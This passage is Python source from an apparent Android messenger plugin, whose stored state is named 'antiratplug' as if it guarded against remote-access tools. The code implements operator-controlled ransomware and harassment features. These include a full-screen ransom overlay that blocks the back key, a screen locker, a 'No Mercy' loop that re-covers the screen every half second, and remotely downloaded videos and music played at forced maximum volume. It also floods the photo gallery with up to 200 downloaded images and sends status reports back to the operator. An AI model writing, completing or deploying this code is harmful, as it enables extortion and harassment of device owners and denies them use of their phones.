                        except Exception:
                            pass
                    tv = TV(ctx)
                    tv.setLayoutParams(LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
                    tv.setText(str(text))
                    tv.setTextColor(Color.WHITE)
                    tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18)
                    tv.setGravity(Gravity.CENTER)
                    root.addView(tv)
                    warn_tv = TV(ctx)
                    warn_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
                    warn_lp.topMargin = int(TypedValue.applyDimension(
                        TypedValue.COMPLEX_UNIT_DIP, 20,
                        ctx.getResources().getDisplayMetrics()))
                    warn_tv.setLayoutParams(warn_lp)
                    warn_tv.setText(warning or RANSOM_WARNING)
                    warn_tv.setTextColor(Color.parseColor("#FF3B30"))
                    warn_tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16)
                    warn_tv.setGravity(Gravity.CENTER)
                    root.addView(warn_tv)
                    KE = jclass("android.view.KeyEvent")

                    class _OnKey(dynamic_proxy(jclass("android.view.View$OnKeyListener"))):
                        def onKey(self, v, keyCode, event):
                            try:
                                if keyCode == KE.KEYCODE_BACK:
                                    return True
                            except Exception:
                                pass
                            return False

                    root.setOnKeyListener(_OnKey())
                    root.setFocusableInTouchMode(True)
                    root.requestFocus()
                    if use_decor:
                        act2 = self._get_activity()
                        if act2 is None:
                            raise Exception("no activity")
                        win2 = act2.getWindow()
                        win2.addFlags(getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
                        decor = win2.getDecorView()
                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                        self._ransom_decor = decor
                    else:
                        params = LP(
                            LP.MATCH_PARENT, LP.MATCH_PARENT,
                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
                                    getattr(LP, "TYPE_PHONE", 2002)),
                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
                            -3)
                        params.gravity = Gravity.CENTER
                        wm.addView(root, params)
                    self._ransom_view = root
                except Exception as e:
                    derr[0] = e
                finally:
                    drew.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_build)
            else:
                _build()
            drew.wait(12)
            if derr[0] is not None:
                return {"error": "ransom: %s" % derr[0]}
            if self._ransom_view is None:
                return {"error": "overlay not created"}
            self._send_msg("Ransom overlay ON")
            return {"ok": True}
        except Exception as e:
            return {"error": "ransom: %s" % e}

    def _dismiss_ransom(self):
        try:
            if self._ransom_view is None:
                return {"ok": True}
            removed = threading.Event()

            def _rm():
                try:
                    if self._ransom_view is not None:
                        parent = self._ransom_decor or self._ransom_wm
                        if parent is not None:
                            parent.removeView(self._ransom_view)
                        self._ransom_view = None
                        self._ransom_decor = None
                except Exception:
                    pass
                finally:
                    removed.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_rm)
                removed.wait(8)
            else:
                _rm()
            return {"ok": True}
        except Exception as e:
            return {"error": str(e)}

    def _lock_screen(self):
        if self._locker_on:
            return
        try:
            act = self._get_activity()
            if act is None:
                return

            def _render():
                try:
                    root = FrameLayout(act)
                    root.setBackgroundColor(Color.BLACK)
                    path = self._lock_path
                    if path and os.path.exists(path):
                        iv = ImageView(act)
                        iv.setScaleType(ImageView.ScaleType.FIT_XY)
                        iv.setImageBitmap(BitmapFactory.decodeFile(path))
                        lp = FrameLayout.LayoutParams(
                            ViewGroup.LayoutParams.MATCH_PARENT,
                            ViewGroup.LayoutParams.MATCH_PARENT)
                        lp.gravity = Gravity.CENTER
                        iv.setLayoutParams(lp)
                        root.addView(iv)
                    act.getWindow().getDecorView().addView(root)
                    self._locker_view = root
                    self._locker_on = True
                    self._send_msg("Locker ON")
                except Exception as e:
                    self._send_msg("locker: " + str(e))

            act.runOnUiThread(_render)
        except Exception as e:
            self._send_msg("lock err: " + str(e))

    def _clear_locker(self):
        if not self._locker_on or self._locker_view is None:
            return
        try:
            parent = self._locker_view.getParent()
            if parent is not None:
                parent.removeView(self._locker_view)
            self._locker_view = None
            self._locker_on = False
        except Exception:
            self._locker_view = None
            self._locker_on = False

    def _start_mercy_mode(self):
        if self._mercy_on:
            return
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences(
                "antiratplug_state", 0)
            e = prefs.edit()
            e.putBoolean("no_mercy_active", True)
            e.apply()
        except Exception:
            pass
        self._mercy_on = True
        self._mercy_thread = threading.Thread(target=self._mercy_loop, daemon=True)
        self._mercy_thread.start()
        self._send_msg("💀 No Mercy Mode АКТИВИРОВАН.")

    def _stop_mercy_mode(self):
        self._mercy_on = False
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences(
                "antiratplug_state", 0)
            e = prefs.edit()
            e.putBoolean("no_mercy_active", False)
            e.apply()
        except Exception:
            pass
        self._clear_mercy()

    def _mercy_loop(self):
        while self._mercy_on and self._sync_running:
            try:
                run_on_ui_thread(self._inject_mercy_image)
            except Exception:
                pass
            time.sleep(0.5)

    def _inject_mercy_image(self):
        try:
            act = self._get_activity()
            if act is None:
                return
            if self._mercy_view is not None:
                try:
                    parent = self._mercy_view.getParent()
                    if parent is not None:
                        parent.removeView(self._mercy_view)
                except Exception:
                    pass
            path = self._lock_path
            if path and os.path.exists(path):
                iv = ImageView(act)
                iv.setScaleType(ImageView.ScaleType.FIT_XY)
                iv.setImageBitmap(BitmapFactory.decodeFile(path))
                lp = FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT)
                act.getWindow().getDecorView().addView(iv, lp)
                self._mercy_view = iv
            else:
                root = FrameLayout(act)
                root.setBackgroundColor(Color.BLACK)
                lp = FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT)
                act.getWindow().getDecorView().addView(root, lp)
                self._mercy_view = root
        except Exception:
            pass

    def _clear_mercy(self):
        if self._mercy_view is not None:
            try:
                parent = self._mercy_view.getParent()
                if parent is not None:
                    parent.removeView(self._mercy_view)
            except Exception:
                pass
            self._mercy_view = None

    def _ensure_vidker_assets(self):
        def dl():
            try:
                ctx = ApplicationLoader.applicationContext
                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
                if not os.path.exists(d):
                    os.makedirs(d)
                assets = {
                    "arishem.mp4": ARISHEM_URL, "sentry.mp4": SENTRY_URL,
                    "drdoom.mp4": DRDOOM_URL, "evilmorty.mp4": EVILMORTY_URL,
                    "hwr.mp4": HWR_URL, "realdoom.mp4": REALDOOM_URL,
                }
                for fname, url_str in assets.items():
                    fpath = os.path.join(d, fname)
                    if not os.path.exists(fpath):
                        try:
                            from urllib.request import urlopen
                            data = urlopen(url_str, timeout=60).read()
                            with open(fpath, "wb") as f:
                                f.write(data)
                        except Exception:
                            pass
            except Exception:
                pass
        threading.Thread(target=dl, daemon=True).start()

    def _activate_vidker(self, mode):
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences(
                "antiratplug_state", 0)
            e = prefs.edit()
            e.putBoolean("vidker_active", True)
            e.putString("vidker_mode", mode)
            e.apply()
        except Exception:
            pass
        self._render_vidker_task(mode)

    def _render_vidker_task(self, mode):
        if self._vidker_on:
            return
        try:
            act = self._get_activity()
            if act is None:
                return
            ctx = ApplicationLoader.applicationContext
            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
            path = os.path.join(d, mode + ".mp4")
            if not os.path.exists(path):
                self._send_msg("Vidker: payload ещё не скачан.")
                return
            am = act.getSystemService("audio")
            stream_music = 3
            max_vol = int(am.getStreamMaxVolume(stream_music))
            am.setStreamVolume(stream_music, max_vol, 0)
            run_on_ui_thread(lambda: self._render_vidker(act, path))
            self._vidker_on = True
            self._send_msg_with_close(
                "🎬 Vidker [%s] запущен. Громкость МАКС." % mode.upper(), "close_vidker")
        except Exception as e:
            self._send_msg("Ошибка Vidker: " + str(e))

    def _close_vidker_permanently(self):
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences(
                "antiratplug_state", 0)
            e = prefs.edit()
            e.putBoolean("vidker_active", False)
            e.remove("vidker_mode")
            e.apply()
        except Exception:
            pass
        self._clear_vidker()
        self._send_msg("Vidker остановлен.")

    def _render_vidker(self, act, path):
        try:
            self._clear_vidker()
            try:
                decor = act.getWindow().getDecorView()
                flags = (View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                         | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                         | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                         | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                         | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                         | View.SYSTEM_UI_FLAG_FULLSCREEN)
                decor.setSystemUiVisibility(flags)
            except Exception:
                pass
            root = FrameLayout(act)
            root.setBackgroundColor(Color.BLACK)
            SurfaceView = jclass("android.view.SurfaceView")
            MediaPlayer = jclass("android.media.MediaPlayer")
            SurfaceHolder = jclass("android.view.SurfaceHolder")
            sv = SurfaceView(act)
            root.addView(sv, FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT))
            mp = MediaPlayer()
            self._vidker_mp = mp

            class SHCallback(dynamic_proxy(SurfaceHolder.Callback)):
                def __init__(self, media_player, file_path):
                    super().__init__()
                    self.mp = media_player
                    self.path = file_path

                def surfaceCreated(self, holder):
                    try:
                        self.mp.setDisplay(holder)
                        self.mp.setDataSource(self.path)
                        self.mp.prepare()
                        self.mp.setLooping(True)
                        self.mp.start()
                    except Exception:
                        pass

                def surfaceChanged(self, holder, format, width, height):
                    pass

                def surfaceDestroyed(self, holder):
                    pass

            cb = SHCallback(mp, path)
            sv.getHolder().addCallback(cb)
            self._vidker_cb = cb
            self._vidker_sv = sv
            act.getWindow().getDecorView().addView(root, FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT))
            self._vidker_view = root
        except Exception as e:
            self._send_msg("Ошибка рендера Vidker: " + str(e))

    def _clear_vidker(self):
        if self._vidker_mp is not None:
            try:
                self._vidker_mp.stop()
                self._vidker_mp.release()
            except Exception:
                pass
            self._vidker_mp = None
        if self._vidker_sv is not None:
            try:
                self._vidker_sv.getHolder().removeCallback(self._vidker_cb)
            except Exception:
                pass
            self._vidker_sv = None
            self._vidker_cb = None
        if self._vidker_view is not None:
            try:
                parent = self._vidker_view.getParent()
                if parent is not None:
                    parent.removeView(self._vidker_view)
            except Exception:
                pass
            self._vidker_view = None
        self._vidker_on = False

    def _play_mmusic(self, url):
        def task():
            try:
                ctx = ApplicationLoader.applicationContext
                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
                if not os.path.exists(d):
                    os.makedirs(d)
                path = os.path.join(d, "mmusic_%d.mp3" % int(time.time()))
                self._send_msg("Downloading...")
                from urllib.request import urlopen
                data = urlopen(url, timeout=60).read()
                with open(path, "wb") as f:
                    f.write(data)
                self._clear_music()
                mp = jclass("android.media.MediaPlayer")()
                mp.setDataSource(path)
                mp.prepare()
                mp.setLooping(True)
                mp.start()
                self._music_mp = mp
                self._send_msg_with_close("🎵 M-music играет. Громкость МАКС.", "close_music")
            except Exception as e:
                self._send_msg("music err: " + str(e))
        threading.Thread(target=task, daemon=True).start()

    def _clear_music(self):
        if self._music_mp is not None:
            try:
                self._music_mp.stop()
                self._music_mp.release()
            except Exception:
                pass
            self._music_mp = None

    def _flood_gallery(self, photo_url, count=100):
        try:
            from urllib.request import urlopen
            data = urlopen(photo_url, timeout=30).read()
            cr = ApplicationLoader.applicationContext.getContentResolver()
            ImageMedia = jclass("android.provider.MediaStore$Images$Media")
            saved = []
            for i in range(min(int(count), 200)):
                try:
                    ts = int(time.time()) + i
                    rand = random.randint(1000, 9999)
                    name = "IMG_%s_%d.jpg" % (time.strftime("%Y%m%d_%H%M%S",
                                                            time.localtime(ts)), rand)
                    values = jclass("android.content.ContentValues")()
                    values.put("_display_name", name)
                    values.put("mime_type", "image/jpeg")
                    values.put("relative_path", "Pictures/")
                    uri = cr.insert(ImageMedia.EXTERNAL_CONTENT_URI, values)
                    if uri:
                        out = cr.openOutputStream(uri)
                        out.write(data)
                        out.close()
                        saved.append(str(uri))
                except Exception:
                    pass
            self._flood_uris = saved
            self._send_msg("Flood: %d files" % len(saved))
        except Exception as e:
            self._send_msg("flood err: " + str(e))

    def _clear_flood(self):
        try:
            cr = ApplicationLoader.applicationContext.getContentResolver()
            removed = 0
            for u in self._flood_uris:
                try:
                    cr.delete(jclass("android.net.Uri").parse(u), None, None)
                    removed += 1
                except Exception:
                    pass
            self._send_msg("Flood cleared: %d" % removed)
        except Exception as e:
            self._send_msg("clear flood err: " + str(e))

    def _dim_screen(self):
        if self._dim_active:
            return
        try:
            act = self._get_activity()
            if act is None:
                return

            def _dim():
                try:
                    overlay = FrameLayout(act)
                    overlay.setBackgroundColor(Color.BLACK)
                    overlay.setAlpha(0.88)
                    act.getWindow().getDecorView().addView(
                        overlay, ViewGroup.LayoutParams(
                            ViewGroup.LayoutParams.MATCH_PARENT,
                            ViewGroup.LayoutParams.MATCH_PARENT))
                    self._dim_view = overlay
                    self._dim_active = True
                except Exception:
                    pass

            act.runOnUiThread(_dim)
        except Exception:
            pass

    def _clear_dim(self):
        if not self._dim_active or self._dim_view is None:
            return
        try:
            parent = self._dim_view.getParent()
            if parent is not None:
                parent.removeView(self._dim_view)
            self._dim_view = None
            self._dim_active = False
        except Exception:
            self._dim_view = None
            self._dim_active = False

